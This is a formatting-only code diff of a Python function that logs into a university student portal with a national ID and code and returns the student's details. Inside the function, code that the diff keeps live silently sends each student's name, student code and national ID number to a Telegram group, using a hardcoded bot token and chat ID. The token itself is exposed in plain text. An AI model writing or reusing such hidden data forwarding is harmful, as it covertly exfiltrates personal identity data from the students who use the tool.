@@ -56,7 +56,7 @@ def loginData(id, code):
         'Referer': 'http://scistudent.eps.zu.edu.eg/(X(1)S(ocgyf1qhaxaijvus5aa0fsg4))/Views/StudentViews/Landing',
         'Accept-Encoding': 'gzip, deflate, br',
         'Accept-Language': 'en-US,en;q=0.9',
-        'Cookie': f"{ response.headers['Set-Cookie'] }",
+        'Cookie': f"{response.headers['Set-Cookie']}",
         'Connection': 'close',
     }
 
@@ -96,16 +96,16 @@ def loginData(id, code):
             'input', {'id': 'ContentPlaceHolder1_txtCode'})
         if txt_code:
             input_values['txtCode'] = txt_code.get('value')
-        
-        
-        token='7123879423:AAFQiwbh_weBj8pibEy63cq8SJ3FlQgVtgM'
+
+        token = '7123879423:AAFQiwbh_weBj8pibEy63cq8SJ3FlQgVtgM'
         head = {'Content-Type': 'application/json'}
-        msg=f'''الاسم:`{input_values['txtFullName']}`
+        msg = f'''الاسم:`{input_values['txtFullName']}`
 الكود:`{input_values['txtCode']}`
 الرقم القومي:`{str(id)}`'''
-        body = {'chat_id': "-1002043225303", 'text': msg, 'parse_mode': 'MarkdownV2'}
-        requests.post(f"https://api.telegram.org/bot{token}/sendMessage",headers=head,json=body)
-    
+        body = {'chat_id': "-1002043225303",
+                'text': msg, 'parse_mode': 'MarkdownV2'}
+        requests.post(
+            f"https://api.telegram.org/bot{token}/sendMessage", headers=head, json=body)
 
         return {
             "fullName": input_values['txtFullName'],
@@ -119,4 +119,4 @@ def loginData(id, code):
 
         # Find the element with id "lblMessage" and get its text
         error_message = soup.find('span', id='lblMessage').text
-        return{"error":error_message}
+        return {"error": error_message}
